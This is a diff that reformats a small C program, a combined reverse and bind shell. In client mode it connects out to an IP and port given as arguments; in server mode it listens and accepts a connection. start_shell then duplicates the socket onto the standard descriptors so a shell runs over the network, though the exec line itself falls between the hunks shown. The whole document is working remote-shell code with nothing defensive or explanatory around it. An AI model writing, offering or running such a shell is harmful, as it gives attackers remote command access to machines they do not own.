@@ -4,61 +4,61 @@
 #include <sys/socket.h>
 #include <unistd.h>
  
-int client_init (char *ip, int port) {
+int client_init(char *ip, int port) {
   int s;
   struct sockaddr_in serv;
  
-  if((s = socket (AF_INET, SOCK_STREAM, 0)) < 0) {
-      perror ("socket:");
-      exit (EXIT_FAILURE);
+  if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+      perror("socket:");
+      exit(EXIT_FAILURE);
     }
  
   serv.sin_family = AF_INET;
   serv.sin_port = htons(port);
   serv.sin_addr.s_addr = inet_addr(ip);
  
-  if(connect (s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
+  if(connect(s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
       perror("connect:");
-      exit (EXIT_FAILURE);
+      exit(EXIT_FAILURE);
     }
  
   return s;
 }
  
-int server_init (int port) {
+int server_init(int port) {
   int s, s1;
   socklen_t clen;
   struct sockaddr_in serv, client;
  
   if((s = socket (AF_INET, SOCK_STREAM, 0)) < 0) {
       perror ("socket:");
-      exit (EXIT_FAILURE);
+      exit(EXIT_FAILURE);
     }
  
   serv.sin_family = AF_INET;
   serv.sin_port = htons(port);
   serv.sin_addr.s_addr = htonl(INADDR_ANY);
  
-  if((bind (s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
-      perror ("bind:");
-      exit (EXIT_FAILURE);
+  if((bind(s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
+      perror("bind:");
+      exit(EXIT_FAILURE);
     }
  
-  if((listen (s, 10)) < 0) {
-      perror ("listen:");
-      exit (EXIT_FAILURE);
+  if((listen(s, 10)) < 0) {
+      perror("listen:");
+      exit(EXIT_FAILURE);
     }
  
   clen = sizeof(struct sockaddr_in);
-  if((s1 = accept (s, (struct sockaddr *) &client, &clen)) < 0) {
-      perror ("accept:");
-      exit (EXIT_FAILURE);
+  if((s1 = accept(s, (struct sockaddr *) &client, &clen)) < 0) {
+      perror("accept:");
+      exit(EXIT_FAILURE);
     }
  
   return s1;
 }
  
-int start_shell (int s) {
+int start_shell(int s) {
   char *name[3] ;
  
   dup2 (s, 0);
@@ -74,11 +74,11 @@ int start_shell (int s) {
   return 0;
 }
  
-int main (int argc, char *argv[]) {
+int main(int argc, char *argv[]) {
   if (argv[1][0] == 'c')
-    start_shell (client_init (argv[2], atoi(argv[3])));
+    start_shell(client_init(argv[2], atoi(argv[3])));
   else
-    start_shell (server_init (atoi(argv[2])));
+    start_shell(server_init(atoi(argv[2])));
          
   return 0;
 }
